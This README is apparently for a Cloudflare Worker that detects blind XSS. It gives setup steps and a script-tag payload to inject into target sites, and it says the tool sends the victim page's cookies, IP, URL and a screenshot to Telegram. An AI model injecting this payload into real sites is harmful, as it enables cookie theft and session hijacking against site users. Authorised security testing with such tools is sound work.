Blind XSS Hunter - Cloudflare Worker
====================================

This Cloudflare Worker script is designed to automate the process of hunting for Blind XSS vulnerabilities in web applications. It leverages the Cloudflare Workers environment to execute JavaScript code that captures screenshots of potentially vulnerable pages and notifies the user via Telegram when a Blind XSS is executed.

Features
--------

*   Automatically captures screenshots of vulnerable pages
*   Sends notifications via Telegram with detailed information about the executed Blind XSS
*   Utilizes Cloudinary for storing screenshots
*   CORS support for client-side JavaScript code execution
*   Lightweight and easy to deploy

Prerequisites
-------------

Before using this script, you need to have the following:

*   A Cloudflare account with Workers enabled
*   A Telegram bot and its API token
*   A Cloudinary account with API key and secret

Installation
------------

1.  Create a new Cloudflare Worker in your Cloudflare account.
    
2.  Copy the contents of the `index.js` file in this repository and paste it into the Cloudflare Worker script editor.
    
3.  Replace the placeholder values for the following constants with your own credentials:
    
    *   `TELEGRAM_TOKEN`: Your Telegram bot API token
    *   `CLOUDINARY_TOKEN`: Your Cloudinary API token (Base64 encoded `api_key:api_secret`)
    *   `CLOUDINARY_API_KEY`: Your Cloudinary API key
    *   `UPLOAD_PRESET`: Your Cloudinary upload preset
    *   `CLOUD_NAME`: Your Cloudinary cloud name
    *   `CHAT_ID`: Your Telegram chat ID for receiving notifications
    *   `CLOUDFLARE_ROUTE`: Your Cloudflare Worker route URL
4.  Save and deploy your Cloudflare Worker.
    

Usage
-----

To use this Cloudflare Worker for hunting Blind XSS, simply include the generated JavaScript in your testing payloads or on the target website.

`<script src="https://your-worker-url.example.com?on=your-target"></script>`

Replace `https://your-worker-url.example.com` with your actual Cloudflare Worker URL and `your-target` with the target website or parameter you are testing.

When a Blind XSS is executed, you will receive a notification in the specified Telegram chat with detailed information about the execution, including the target, IP address, user agent, URL, cookie, and a screenshot of the page.

Disclaimer
----------

This tool is intended for ethical security testing purposes only. Do not use it to exploit vulnerabilities without the consent of the website owner. The developers of this tool are not responsible for any misuse or malicious activities.

License
-------

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
